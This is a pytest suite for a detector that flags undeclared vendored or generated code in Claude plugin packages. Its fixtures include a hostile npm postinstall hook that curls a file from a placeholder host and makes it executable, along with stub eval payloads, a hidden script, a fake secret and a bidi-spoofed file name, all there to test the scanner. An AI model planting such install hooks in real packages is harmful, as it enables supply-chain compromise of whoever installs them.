"""Undeclared vendored or generated plugin code must fail closed as one scope finding."""

from __future__ import annotations

import json
from pathlib import Path

from appguardrail_core.claude_plugin_detector import (
    build_claude_plugin_scan_receipt,
    inspect_claude_plugin_file,
    scan_claude_plugin_package,
)


_PINNED_COMMIT = "a727be1c7bd6064419b6f60d71993a19198adc17"
_SCOPE_RULE = "claude-plugin-vendored-scope-undeclared"
_UNDECLARED_RULE = "claude-plugin-undeclared-executable"
_EVAL_RULE = "claude-plugin-dynamic-eval"
_NFC_RULE = "claude-plugin-inconsistent-normalized-name"
_SECRET = "sk-example-must-not-leak"
_BIDI = "\u202e"
_NFC_NAME = "caf\u00e9"
_NFD_NAME = "cafe\u0301"


def _write_json(path: Path, payload: dict) -> None:
    """Write one JSON document under ``path``."""
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(
        json.dumps(payload, ensure_ascii=False, indent=2) + "\n",
        encoding="utf-8",
    )


def _licensed_plugin(
    root: Path,
    *,
    name: str = "safe-plugin",
    hook_path: str = "hooks/pre.sh",
    files: list[object] | None = None,
) -> Path:
    """Write a pinned licensed plugin with one declared shell hook."""
    manifest: dict[str, object] = {
        "name": name,
        "version": "1.0.0",
        "source": {
            "source": "github",
            "repo": "example/safe-plugin",
            "ref": _PINNED_COMMIT,
        },
        "hooks": {"PreToolUse": [{"command": hook_path}]},
    }
    if files is not None:
        manifest["files"] = files
    _write_json(root / ".claude-plugin" / "plugin.json", manifest)
    hook = root / hook_path
    hook.parent.mkdir(parents=True, exist_ok=True)
    hook.write_text("#!/bin/sh\necho session\n", encoding="utf-8")
    (root / "LICENSE").write_text("MIT\n", encoding="utf-8")
    return root


def _scope_hits(root: Path) -> tuple:
    """Return package-scan hits for the vendored-scope rule."""
    return tuple(
        hit for hit in scan_claude_plugin_package(root) if hit.rule_id == _SCOPE_RULE
    )


def test_undeclared_vendor_leftpad_fails_admission(tmp_path: Path) -> None:
    """Unchecked ``vendor/leftpad.js`` is undeclared third-party scope."""
    root = _licensed_plugin(tmp_path)
    vendor = root / "vendor" / "leftpad.js"
    vendor.parent.mkdir()
    vendor.write_text("module.exports = function (s) { return s; };\n", encoding="utf-8")

    hits = _scope_hits(root)
    receipt = build_claude_plugin_scan_receipt(root)
    assert hits
    assert all("_" in hit.rule_id or "-" in hit.rule_id for hit in hits)
    assert receipt.scan_result == "fail"
    assert _SCOPE_RULE in receipt.finding_summary


def test_undeclared_node_modules_fails_admission(tmp_path: Path) -> None:
    """Checked-in ``node_modules/foo/index.js`` is undeclared vendored scope."""
    root = _licensed_plugin(tmp_path)
    bundled = root / "node_modules" / "foo" / "index.js"
    bundled.parent.mkdir(parents=True)
    bundled.write_text("module.exports = 1;\n", encoding="utf-8")

    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE in receipt.finding_summary
    assert receipt.scan_result == "fail"


def test_no_vendor_node_modules_or_dist_is_not_this_finding(tmp_path: Path) -> None:
    """A first-party tree without vendored or generated copies is not this class."""
    root = _licensed_plugin(tmp_path)
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_declared_hook_pre_sh_only_passes(tmp_path: Path) -> None:
    """A declared ``hooks/pre.sh`` plus LICENSE stays admitted."""
    root = _licensed_plugin(tmp_path, hook_path="hooks/pre.sh")
    rule_ids = {hit.rule_id for hit in scan_claude_plugin_package(root)}
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE not in rule_ids
    assert _UNDECLARED_RULE not in rule_ids
    assert receipt.scan_result == "pass"


def test_package_json_lockfile_without_node_modules_is_not_this_finding(
    tmp_path: Path,
) -> None:
    """A lockfile-backed manifest without a checked-in install tree is inventory."""
    root = _licensed_plugin(tmp_path)
    _write_json(
        root / "package.json",
        {"name": "safe-plugin", "dependencies": {"leftpad": "1.0.0"}},
    )
    _write_json(root / "package-lock.json", {"lockfileVersion": 3, "packages": {}})
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_files_field_declared_generated_bundle_is_not_this_finding(
    tmp_path: Path,
) -> None:
    """``plugin.json`` ``files[]`` binds generated output as declared scope."""
    root = _licensed_plugin(tmp_path, files=["dist/app.min.js", "", 3])
    generated = root / "dist" / "app.min.js"
    generated.parent.mkdir()
    generated.write_text("console.log(0);\n", encoding="utf-8")
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_undeclared_min_js_bundle_fails_admission(tmp_path: Path) -> None:
    """An undeclared ``*.min.js`` bundle is generated-code scope ambiguity."""
    root = _licensed_plugin(tmp_path)
    (root / "app.min.js").write_text("console.log(1);\n", encoding="utf-8")
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE in receipt.finding_summary
    assert receipt.scan_result == "fail"


def test_node_modules_is_one_scope_finding_not_hook_findings(
    tmp_path: Path,
) -> None:
    """Vendored trees emit one scope finding, not per-file hook findings."""
    root = _licensed_plugin(tmp_path)
    for name in ("foo", "bar", "baz"):
        payload = root / "node_modules" / name / "index.js"
        payload.parent.mkdir(parents=True)
        payload.write_text("eval('third-party');\n", encoding="utf-8")
    hook_vendor = root / "hooks" / "node_modules" / "foo" / "index.js"
    hook_vendor.parent.mkdir(parents=True)
    hook_vendor.write_text("eval('hook-vendor');\n", encoding="utf-8")
    (root / "node_modules" / "foo" / "package.json").write_text(
        json.dumps(
            {
                "scripts": {
                    "postinstall": "curl -o x https://example.invalid/x && chmod +x x"
                }
            }
        )
        + "\n",
        encoding="utf-8",
    )
    hidden = root / "node_modules" / ".bin" / "run.sh"
    hidden.parent.mkdir()
    hidden.write_text("#!/bin/sh\neval stealth\n", encoding="utf-8")
    (root / "node_modules" / "foo" / "SKILL.md").write_text(
        "---\nname: helper\n---\nUse the helper.\n",
        encoding="utf-8",
    )

    hits = scan_claude_plugin_package(root)
    receipt = build_claude_plugin_scan_receipt(root)
    scope_hits = [hit for hit in hits if hit.rule_id == _SCOPE_RULE]
    assert len(scope_hits) == 1
    assert _SCOPE_RULE in receipt.finding_summary
    assert _EVAL_RULE not in receipt.finding_summary
    assert _UNDECLARED_RULE not in receipt.finding_summary
    assert "claude-plugin-hidden-undeclared-executable" not in receipt.finding_summary
    assert "claude-plugin-unsigned-executable-download" not in receipt.finding_summary
    assert receipt.scan_result == "fail"


def test_non_list_files_field_does_not_declare_scope(tmp_path: Path) -> None:
    """A string ``files`` value is not a bounded files[] identity."""
    root = _licensed_plugin(tmp_path, files=None)
    payload = json.loads(
        (root / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8")
    )
    payload["files"] = "vendor/leftpad.js"
    _write_json(root / ".claude-plugin" / "plugin.json", payload)
    vendor = root / "vendor" / "leftpad.js"
    vendor.parent.mkdir()
    vendor.write_text("module.exports = 1;\n", encoding="utf-8")
    receipt = build_claude_plugin_scan_receipt(root)
    assert _SCOPE_RULE in receipt.finding_summary
    assert receipt.scan_result == "fail"


def test_hangul_nfc_identity_is_unchanged(tmp_path: Path) -> None:
    """#1155 Hangul syllables stay admitted and are not this scope class."""
    root = _licensed_plugin(tmp_path, name="가드")
    receipt = build_claude_plugin_scan_receipt(root)
    assert _NFC_RULE not in receipt.finding_summary
    assert _SCOPE_RULE not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_nfd_name_stays_normalized_name_class(tmp_path: Path) -> None:
    """#1155 combining-mark names stay the NFC class, not vendored scope."""
    root = _licensed_plugin(tmp_path, name=_NFD_NAME)
    body = (root / ".claude-plugin" / "plugin.json").read_text(encoding="utf-8")
    hits = inspect_claude_plugin_file(
        "plugin.json",
        ".claude-plugin/plugin.json",
        body,
    )
    receipt = build_claude_plugin_scan_receipt(root)
    rule_ids = {hit.rule_id for hit in hits}
    assert _NFC_RULE in rule_ids
    assert _SCOPE_RULE not in rule_ids
    assert _SCOPE_RULE not in receipt.finding_summary
    assert _NFC_RULE in receipt.finding_summary


def test_nfc_latin_name_is_not_this_finding(tmp_path: Path) -> None:
    """Precomposed Latin names stay #1155-negative and are not vendored scope."""
    root = _licensed_plugin(tmp_path, name=_NFC_NAME)
    receipt = build_claude_plugin_scan_receipt(root)
    assert _NFC_RULE not in receipt.finding_summary
    assert _SCOPE_RULE not in receipt.finding_summary
    assert receipt.scan_result == "pass"


def test_vendored_scope_snippets_omit_secrets_and_bidi(tmp_path: Path) -> None:
    """Scope snippets are path labels and omit secret literals and raw bidi."""
    root = _licensed_plugin(tmp_path)
    vendor = root / "vendor" / f"{_BIDI}leftpad.js"
    vendor.parent.mkdir()
    vendor.write_text(f"module.exports = '{_SECRET}';\n", encoding="utf-8")
    hits = _scope_hits(root)
    receipt = build_claude_plugin_scan_receipt(root)
    serialized = json.dumps(receipt.as_dict())
    assert hits
    assert all(_SECRET not in hit.snippet for hit in hits)
    assert all(_BIDI not in hit.snippet for hit in hits)
    assert _SECRET not in serialized
    assert _BIDI not in serialized
    assert _SCOPE_RULE in receipt.finding_summary
